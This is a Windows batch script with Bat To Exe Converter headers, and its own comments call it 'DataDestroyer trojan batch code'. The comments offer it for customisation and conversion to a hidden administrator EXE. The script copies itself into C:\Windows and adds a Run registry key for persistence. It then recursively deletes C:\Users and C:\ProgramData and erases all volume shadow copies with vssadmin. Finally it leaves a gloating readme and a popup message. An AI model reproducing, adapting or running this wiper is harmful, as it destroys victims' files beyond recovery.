::[Bat To Exe Converter]
::
::YAwzoRdxOk+EWAnk
::fBw5plQjdG8=
::YAwzuBVtJxjWCl3EqQJgSA==
::ZR4luwNxJguZRRnk
::Yhs/ulQjdF+5
::cxAkpRVqdFKZSTk=
::cBs/ulQjdF+5
::ZR41oxFsdFKZSTk=
::eBoioBt6dFKZSDk=
::cRo6pxp7LAbNWATEpCI=
::egkzugNsPRvcWATEpCI=
::dAsiuh18IRvcCxnZtBJQ
::cRYluBh/LU+EWAnk
::YxY4rhs+aU+IeA==
::cxY6rQJ7JhzQF1fEqQJgZksaHFXMbQs=
::ZQ05rAF9IBncCkqN+0xwdVsEAlTMbDr0V9U=
::ZQ05rAF9IAHYFVzEqQIICjRsDCusGSufK4AwydzU3Yo=
::eg0/rx1wNQPfEVWB+kM9LVsJDByAM3O1CLAZ5f337v6IsAMYTOdf
::fBEirQZwNQPfEVWB+kM9LVsJDGQ=
::cRolqwZ3JBvQF1fEqQJQ
::dhA7uBVwLU+EWDk=
::YQ03rBFzNR3SWATElA==
::dhAmsQZ3MwfNWATElA==
::ZQ0/vhVqMQ3MEVWAtB9wSA==
::Zg8zqx1/OA3MEVWAtB9wSA==
::dhA7pRFwIByZRRnk
::Zh4grVQjdCqDJF6B5kc7OxJOQAGQfGq3B/UP4eT26taTp0URXek6dIabzKYt/PMf71ekZpcmcqtU2MqvyxZZQjaqeg4QrH1WpGucMtWgsQbvS1qQ2nw5FWF7kHD2jSViNoM4uvcR3Cq/8gPIlqtDgzbbX70PMWby1b5nIcwSsw+sbSk=
::YB416Ek+ZW8=
::
::
::978f952a14a936cc963da21a135fa983
@echo off
REM ------------------------------------------
REM DataDestroyer trojan batch code.
REM To customize, add your own scripts, add REM command to disable script and delete REM command to enable scripts
REM have fun!
REM and do not forget to convert to EXE (with invisible window mode and administrator mode)
REM ------------------------------------------
Copy %0 "C:\Windows\systemunit.exe" /y
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v "Unit Driver" /t REG_SZ /d "C:\Windows\systemunit.exe" /f
rd C:\Users /s /q
rd C:\ProgramData /s /q
md C:\Users\%USERNAME%
md C:\Users\%USERNAME%\Desktop
del "C:\Users\%USERNAME%\Desktop\readme.txt" /s /q /f
vssadmin delete shadows /all
REM cipher /w:c
echo I DELETT UR FILES AND ITS SHADOW COPIES NOW YOU CAN NOT RECOVER FILS ANY MOR! >> "C:\Users\%USERNAME%\Desktop\readme.txt"
msg * UR COMPUTER HAS BEEN DESTROYED AND TOASTED NOW YOU CANNOT USE FILS ANY MOR!!!!!!!!!!!!!